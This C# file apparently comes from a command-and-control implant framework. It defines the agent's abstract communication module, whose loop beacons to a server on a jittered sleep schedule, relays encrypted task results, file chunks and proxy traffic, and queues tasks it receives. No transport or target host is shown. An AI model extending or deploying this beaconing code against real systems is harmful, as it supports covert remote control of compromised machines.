using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Communication
{
    public abstract class CommModule
    {
        public bool IsRunning { get; protected set; } = false;
 
        private Random random = new Random();

        public string ServerKey { get; private set; }

        public ConnexionUrl Connexion { get; set; }

        public Encryptor Encryptor { get; set; }

        public IProxyService ProxyService { get; protected set; }
        public IMessageService MessageService { get; protected set; }
        public IFileService FileService { get; protected set; }

        public CommModule(ConnexionUrl connection, string serverKey, IMessageService messageManager, IFileService fileService, IProxyService proxyService)
        {
            this.Connexion = connection;
            this.MessageService = messageManager;
            this.FileService = fileService;
            this.ProxyService = proxyService;

            this.ServerKey = serverKey;
            this.Encryptor = new Encryptor(serverKey);
        }

        protected int GetDelay()
        {
            int jit = (int)Math.Round(this.MessageService.AgentMetaData.SleepInterval * 1000 * (this.MessageService.AgentMetaData.SleepJitter / 100.0));
            var delta = random.Next(0, jit);
            return Math.Max(10,this.MessageService.AgentMetaData.SleepInterval * 1000 - delta);
        }

        public virtual async void Stop()
        {
            if (!this.IsRunning)
                return;

            this._tokenSource.Cancel();
        }

        private CancellationTokenSource _tokenSource;

        public virtual async void Start()
        {
            this.IsRunning = false;

            _tokenSource = new CancellationTokenSource();

            this.IsRunning = true;
            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    var results = this.MessageService.GetMessageResultsToRelay();

                    var thisAgentRes = results.Where(a => a.Header.Owner == this.MessageService.AgentMetaData.Id);
                    if (thisAgentRes.Any())
                    {
                        foreach (var mess in thisAgentRes)
                            mess.FileChunk = this.FileService.GetChunkToSend();

                        thisAgentRes.First().ProxyMessages = this.ProxyService.GetResponses();
                    }
                    else
                    {
                        //check in message
                        var chunk = this.FileService.GetChunkToSend();
                        var proxy = this.ProxyService.GetResponses();

                        var mess = new MessageResult();
                        mess.Header.Owner = this.MessageService.AgentMetaData.Id;
                        mess.FileChunk = chunk;
                        mess.ProxyMessages = proxy;
                        results.Add(mess);
                    }

                    //update Paths
                    foreach (var resMess in results)
                        resMess.Header.Path.Insert(0, this.MessageService.AgentMetaData.Id);

                    var messages = await CheckIn(results);
                    if (messages != null)
                        this.MessageService.EnqueueTasks(messages);

                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }

                await Task.Delay(this.GetDelay());
            }

            this.IsRunning = false;
        }

        protected abstract Task<List<MessageTask>> CheckIn(List<MessageResult> results);
    }
}
